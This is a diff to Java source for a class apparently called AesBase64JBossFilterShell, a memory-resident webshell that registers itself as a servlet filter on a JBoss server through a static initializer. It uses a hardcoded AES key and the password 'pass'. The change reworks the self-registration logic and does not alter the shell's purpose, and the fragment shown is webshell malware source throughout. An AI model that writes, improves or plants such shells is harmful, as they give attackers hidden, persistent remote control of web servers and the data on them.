@@ -5,15 +5,13 @@ import java.lang.reflect.*;
 import java.util.*;
 
 public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
-    private static boolean initialized = false;
-    private static final Object lock = new Object();
     private static Class payloadClass;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
 
 
     static {
-        new AesBase64JBossFilterShell();
+        new AesBase64JBossFilterShell().addFilter();
     }
 
     public AesBase64JBossFilterShell(ClassLoader loader) {
@@ -21,15 +19,14 @@ public class AesBase64JBossFilterShell extends ClassLoader implements Filter {
     }
 
     public AesBase64JBossFilterShell() {
-        synchronized (lock) {
-            if (!initialized) {
-                initialized = true;
-                try {
-                    addFilter(AesBase64JBossFilterShell.class);
-                } catch (Throwable e) {
 
-                }
-            }
+    }
+
+    private void addFilter() {
+        try {
+            addFilter(this.getClass());
+        } catch (Throwable e) {
+
         }
     }
 
